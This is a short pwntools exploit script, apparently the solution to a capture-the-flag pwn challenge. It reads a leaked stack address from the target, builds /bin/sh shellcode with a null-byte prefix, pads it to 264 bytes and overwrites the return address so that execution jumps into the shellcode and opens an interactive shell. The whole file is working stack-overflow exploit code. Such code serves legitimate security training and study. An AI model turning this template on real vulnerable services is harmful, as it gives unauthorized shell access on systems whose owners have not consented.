#!/usr/bin/env python3

from pwn import *

exe = ELF("./bin/chall")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("localhost", 5000)

    return r


def main():
    r = conn()

    addr = int(r.recvline().decode()[2:], 16)

    log.info(f"Stack address: {hex(addr)}")

    payload = shellcraft.sh()

    payload = b'\x00' + asm(payload)

    payload = payload.ljust(264, b'A')
    payload += p64(addr + 1)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
